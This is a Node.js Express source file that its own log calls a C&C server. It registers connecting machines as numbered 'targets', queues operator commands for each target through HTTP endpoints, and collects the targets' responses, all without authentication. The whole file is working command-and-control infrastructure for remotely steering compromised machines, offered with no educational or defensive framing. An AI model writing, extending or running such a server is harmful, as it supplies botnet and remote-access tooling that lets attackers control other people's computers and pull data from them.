var express = require('express')
var bodyParser = require('body-parser')
var app = express();
var _commands = {};
var _n = 0;
var nodes = [];
var _responses = {};

app.use(express.static(__dirname + '/public'));
app.use(bodyParser.urlencoded());

var server = app.listen(8083, function () {
   var host = server.address().address
   var port = server.address().port
   console.log("C&C Hosted at", host, port)
})

app.get('/', function (req, res) {
   res.sendFile(__dirname + "/public/index.html");
});

app.get('/getid', function(req, res) {
  res.send(JSON.stringify({n:_n}));
  nodes.push(_n)
  _n = _n+1;
});

app.get('/gettargets', function(req, res){
  res.send({
    targets: nodes
  });
});

app.get('/command/:id', function(req, res){
  var id = req.params.id;
  res.send(_commands[id] ? _commands[id].command : "");
  _commands[id] = null;
});

app.post('/command/:id', function(req, res){
  var id = req.params.id;
  console.log(id)
  _commands[id] = {
    command: req.body.command
  };
  console.log("Received command from web client: "+_commands[id].command)
  res.send(req.body);
});

app.get('/response/:id', function(req, res){
  var id = req.params.id;
  res.send(_responses[id] ? _responses[id] : "");
  _responses[id] = null;
});

app.post('/response/:id', function(req, res){
  var id = req.params.id;
  console.log("Received response from target: "+req.body.response);
  _responses[id] = req.body;
  res.send('success');
});
